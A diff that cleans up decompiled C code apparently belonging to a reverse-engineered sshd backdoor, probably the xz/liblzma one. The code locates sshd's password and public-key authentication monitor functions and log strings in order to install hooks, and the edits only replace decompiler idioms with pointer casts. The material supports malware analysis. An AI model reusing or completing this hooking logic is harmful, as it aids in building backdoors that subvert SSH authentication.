@@ -383,7 +383,7 @@ LAB_00105951:
              (local_980.string_refs.entries[0x12].func_start != (void *)0x0)) {
             psVar52->mm_request_send_start = local_980.string_refs.entries[0x12].func_start;
             psVar52->mm_request_send_end = local_980.string_refs.entries[0x12].func_end;
-            local_a98 = CONCAT44(local_a98._4_4_,0x400);
+            local_a98 = CONCAT44(*(uint *)((u8 *)&local_a98 + 4),0x400);
             pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_a98,(void *)0x0);
             psVar52->STR_without_password = pcVar37;
             if ((pcVar37 != (char *)0x0) &&
@@ -397,7 +397,7 @@ LAB_00105951:
               psVar52->mm_answer_authpassword_end = (void *)0x0;
               psVar52->mm_answer_authpassword_ptr = (sshd_monitor_func_t *)0x0;
             }
-            local_a98 = CONCAT44(local_a98._4_4_,0x7b8);
+            local_a98 = CONCAT44(*(uint *)((u8 *)&local_a98 + 4),0x7b8);
             pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_a98,(void *)0x0);
             psVar52->STR_publickey = pcVar37;
             if (pcVar37 != (char *)0x0) {
@@ -439,7 +439,7 @@ LAB_00105951:
               }
               bVar23 = FALSE;
               pcVar37 = (char *)0x0;
-              local_a90 = CONCAT44(local_a90._4_4_,0x198);
+              local_a90 = CONCAT44(*(uint *)((u8 *)&local_a90 + 4),0x198);
               while (pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_a90,pcVar37),
                     pcVar37 != (char *)0x0) {
                 local_9d8.instruction = (u8 *)0x0;
@@ -475,7 +475,7 @@ LAB_00105951:
                       }
                       pdVar56 = &local_9d8;
                       bVar23 = FALSE;
-                      local_9d8.instruction_size._0_4_ = 0x70;
+                      *(uint *)&local_9d8.instruction_size = 0x70;
                       local_9d8.instruction = (u8 *)0xc5800000948;
                       goto LAB_00106471;
                     }
@@ -526,7 +526,7 @@ LAB_001064b8:
        ((local_b10->global_ctx).uses_endbr64 != FALSE)) {
       iVar61 = 0;
       lVar45 = 0;
-      local_9d8.instruction_size._0_4_ = 0x10;
+      *(uint *)&local_9d8.instruction_size = 0x10;
       local_9d8.instruction = (u8 *)0xf0000000e;
       hooks = (backdoor_hooks_data_t *)0x0;
       do {
@@ -589,7 +589,7 @@ LAB_001065af:
           if (BVar26 != FALSE) break;
           local_b48 = local_b48 + 1;
         }
-        if ((local_a30._40_4_ & 0xfffffffd) == 0xb1) {
+        if ((*(u32 *)&local_a30.opcode_window[3] & 0xfffffffd) == 0xb1) {
           if (local_a30.prefix.decoded.modrm.breakdown.modrm_mod != '\x03') goto LAB_00106735;
           if ((local_a30.prefix.flags_u16 & 0x1040) == 0) {
             if ((local_a30.prefix.flags_u16 & 0x40) != 0) {
@@ -662,7 +662,7 @@ LAB_001068e4:
               puVar46 = (u8 *)local_9d8.mem_disp;
               if (((uint)local_9d8.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
                 puVar46 = (u8 *)(local_9d8.mem_disp + (long)local_9d8.instruction) +
-                          CONCAT44(local_9d8.instruction_size._4_4_,
+                          CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                                    (undefined4)local_9d8.instruction_size);
               }
               local_a90 = 0;
@@ -678,7 +678,7 @@ LAB_00106997:
               puVar60 = puVar55;
             }
             puVar55 = local_9d8.instruction +
-                      CONCAT44(local_9d8.instruction_size._4_4_,
+                      CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                                (undefined4)local_9d8.instruction_size);
             puVar47 = puVar46;
           }
@@ -698,23 +698,23 @@ LAB_00106b3c:
               peVar31 = &local_980.main_info;
               psVar53->log_handler_ctx_ptr = puVar60;
               psVar53->log_hooking_possible = TRUE;
-              local_9d8.instruction = (u8 *)CONCAT44(local_9d8.instruction._4_4_,0x708);
+              local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x708);
               pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_9d8,(void *)0x0);
               psVar53->STR_percent_s = pcVar37;
               if (pcVar37 != (char *)0x0) {
-                local_9d8.instruction = (u8 *)CONCAT44(local_9d8.instruction._4_4_,0x790);
+                local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x790);
                 pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_9d8,(void *)0x0);
                 psVar53->STR_Connection_closed_by = pcVar37;
                 if (pcVar37 != (char *)0x0) {
-                  local_9d8.instruction = (u8 *)CONCAT44(local_9d8.instruction._4_4_,0x4f0);
+                  local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x4f0);
                   pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_9d8,(void *)0x0);
                   psVar53->STR_preauth = pcVar37;
                   if (pcVar37 != (char *)0x0) {
-                    local_9d8.instruction = (u8 *)CONCAT44(local_9d8.instruction._4_4_,0x1d8);
+                    local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x1d8);
                     pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_9d8,(void *)0x0);
                     psVar53->STR_authenticating = pcVar37;
                     if (pcVar37 != (char *)0x0) {
-                      local_9d8.instruction = (u8 *)CONCAT44(local_9d8.instruction._4_4_,0xb10);
+                      local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0xb10);
                       pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_9d8,(void *)0x0);
                       psVar53->STR_user = pcVar37;
                       if (pcVar37 != (char *)0x0) break;
@@ -727,7 +727,7 @@ LAB_00106b3c:
             }
           }
         }
-        else if ((((local_a30._40_4_ == 0x147) &&
+        else if ((((*(u32 *)&local_a30.opcode_window[3] == 0x147) &&
                   ((uint)local_a30.prefix.decoded.modrm >> 8 == 0x50000)) &&
                  ((local_a30.prefix.flags_u16 & 0x800) != 0)) &&
                 (local_a30.operand_zeroextended == 0)) {
@@ -754,7 +754,7 @@ LAB_00106b3c:
                 puVar60 = (u8 *)local_9d8.mem_disp;
                 if (((uint)local_9d8.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
                   puVar60 = (u8 *)(local_9d8.mem_disp + (long)local_9d8.instruction) +
-                            CONCAT44(local_9d8.instruction_size._4_4_,
+                            CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                                      (undefined4)local_9d8.instruction_size);
                 }
                 local_a90 = 0;
@@ -763,10 +763,10 @@ LAB_00106b3c:
                     (puVar55 <= puVar60)) && (puVar47 != puVar60)) goto LAB_00106b3c;
               }
               puVar60 = local_9d8.instruction +
-                        CONCAT44(local_9d8.instruction_size._4_4_,
+                        CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                                  (undefined4)local_9d8.instruction_size);
             } while (local_9d8.instruction +
-                     CONCAT44(local_9d8.instruction_size._4_4_,
+                     CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                               (undefined4)local_9d8.instruction_size) <
                      local_980.string_refs.entries[0x1a].func_end);
             goto LAB_00106ab1;
